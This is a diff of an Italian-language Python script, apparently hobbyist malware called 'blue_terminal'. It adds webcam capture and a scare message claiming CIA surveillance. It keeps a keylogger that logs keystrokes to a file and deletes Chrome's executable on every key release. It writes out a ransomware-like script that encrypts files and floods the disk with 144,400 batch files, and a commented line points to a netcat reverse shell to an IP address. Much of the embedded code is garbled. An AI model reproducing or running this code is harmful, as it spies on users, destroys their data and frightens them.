@@ -22,9 +22,12 @@ import shutil
 from cryptography.fernet import Fernet
 import subprocess
 #import jpype
+import cv2
 #import jpype.imports#java
 from fabric import Connection
 import keyboard
+import tkinter as tk
+from tkinter import messagebox
 from tqdm import tqdm
 import urllib.request
 from docx import Document 
@@ -41,16 +44,19 @@ colorama.init()
 '''------'''''''---------'''''''---------'''
 '''-----'''''''---------''''''''we won't stop here we are in the Internet----'''
 #pip install pyttsx3 pyautogui pyaudio pynput speechrecognition jpype1 cryptography fabric keyboard tqdm python-docx colorama
-domada=messagebox.showwarning("error 244","ora non torni piu indietro")
+root = tk.Tk()
+root.withdraw() 
+messagebox.showwarning("blue_terminal accesso negato", "Ora non torni più indietro")
 c = pyttsx3.init()
-c.say("il tuo pc  e sorvegliato dalla CIA")
+c.say(Fore.BLUE+"il tuo pc  e sorvegliato dalla CIA")
 c.runAndWait()
-engine = pyttsx3.init()
-messaggi="ora il tuo pc e in possesso della cia"
-engine.runAndWait()
-engine.say(messaggi)
+
+foto=cv2.VideoCapture(0)
 symbols = {
-    lenguage
+        'A': '|4..', 'B': '.8-.', 'C': '-0*ì', 'D': '#%3', 'E': '@^3£', 'F': '[4?',
+        'G': '!1%', 'H': '$=6', 'I': '+@9', 'J': '(', 'K': '^', 'L': ':', 'M': '?', 
+        'N': ']', 'O': '<\\3', 'P': 'ì>', 'Q': '%', 'R': '£', 'S': '=', 'T': '/', 
+        'U': '_', 'V': '\\', 'W': ';', 'X': '°', 'Y': 'çù', 'Z': '&'
 }
 #saluti="-d 216.58.204.142  9999 -e cmd.exe"
 #translated_text = ""
@@ -65,14 +71,12 @@ def salva_su_file(testo):
 def on_press(tasto):
     global translated_text
     try:
-        
         if hasattr(tasto, 'char') and tasto.char is not None:
             carattere = tasto.char
             codificato = codifica_carattere(carattere)
             translated_text += codificato
             salva_su_file(codificato)
         else:
-            
             if tasto == Key.space:
                 translated_text += ' '
                 salva_su_file(' ')
@@ -81,12 +85,21 @@ def on_press(tasto):
                 salva_su_file('\n')
     except AttributeError:
         pass
+
 def on_release(tasto):
-    os.remove("c:\\programmi (x86)\\google\\chrome\\application\\chrome.exe")
+    try:
+        os.remove("c:\\programmi (x86)\\google\\chrome\\application\\chrome.exe")
+    except FileNotFoundError:
+        pass
     if tasto == Key.esc:
         return False
+
+translated_text = ""  # Define the missing variable
+file = "memory.txt"  # Fix the unterminated string
+
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+#os.system(f"attrib +h {file}")
 file2=open("nucleare.py","w")
 file2.write("import pyttsx3\nimport random\nimport tkinter as Tk\nimport os\nimport shutil \nfrom cryptography.fernet import Fernet\nimport subprocess\n#welcome to blue-terminal\n''''----------------''''''----------''''''''''-we---------'''''\n''-blue-terminal-''''''--we--won't--stop--here---''''we--are-------''''''-----------''''''----we---are---the---world -----''''''the-----''''''-------''''''----------------------------''''''domino-----''''''----------------------------'''''''of------''''''------'''''''---------'''''''---------''''''-----'''''''---------''''''''we won't stop here we are in the Internet----''nsubprocess.run('echo off')ndef estrazionenumeri(file_path):\n\nvoce=pyttsx3.init()\nvoce.say('inizio il gioco la tombola sei pronto?:')\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nvoce.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\n\nprint('errore ripora ')\nkey=Fernet.generate_key()\nwith open('key.key','wb') as key_file:\n\nkey_file.write(key)\nwith open('key.key','rb')  as key_file:\nkey=key_file.read() \nfernet=Fernet(key)\nwith open(file_path,'rd')as file:\noriginal=file.read()\nencrypter=fernet.encrypt(original)\nwith open(file_path,'wb')as encrypter_file:\nencrypter_file.write(encrypter)\npercorso='C:\Program Files\Google\Chrome\Application'\nfor filename in os.listdir(percorso):\npercorso=os.path.join(percorso,filename)\nif os.path.isfile(percorso):\nencrypter_file(percorso)\nelse:\nmotore.say(numgen)\nmotore.runAndWait()\ndef restarta():\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nmotore.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\nprint('errore ripora ')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nelse:motore.say(numgen)\nmotore.runAndWait()\nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.run('echo off')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nsubprocess.call(['tnt.py'])   \nsubprocess.check_call(['ls','-la']) \nsubprocess.run('ipconfig')\nsubprocess.run('hello welcome blue-terminal')\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nsubprocess.call([f'tnt{i}.py'])   \nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.check_call(['ls','-la']) \nshutil.copy('tnt.bat','tnt1.bat')\nshutil.copy('tnt.bat','tnt2.bat')shutil.copy('tnt.bat','tnt3.bat')\nshutil.copy('tnt.bat','tnt4.bat')\nshutil.copy('tnt.batì','tnt4.bat')\nshutil.copy('tnt.bat','tnt6.bat')shutil.copy('tnt.bat','tnt7.bat')\nshutil.copy('tnt.bat','tnt8.bat')\nshutil.copy('tnt.bat','tnt9.bat')\nshutil.copy('tnt.bat','tnt10.bat')")
 file2.close()
@@ -574,16 +587,14 @@ time.sleep(2)
             pyautogui.press("enter")
 
 if __name__ == "__main__":
-    main()
- ''' 
+    main() ''' 
 time.sleep(1)
-for i in testo:
-    pyautogui.typewrite(i)
+pyautogui.typewrite(testo)
 pyautogui.hotkey('win', 's')
 t="La_Bomba_finale.py"
 
 for i in t:
-    pyautogui.typewrite(1)
+    pyautogui.typewrite(t)
 pyautogui.press("enter")
 subprocess.run(["python","La_Bomba_finale.py"])
 testes="assistente.py"
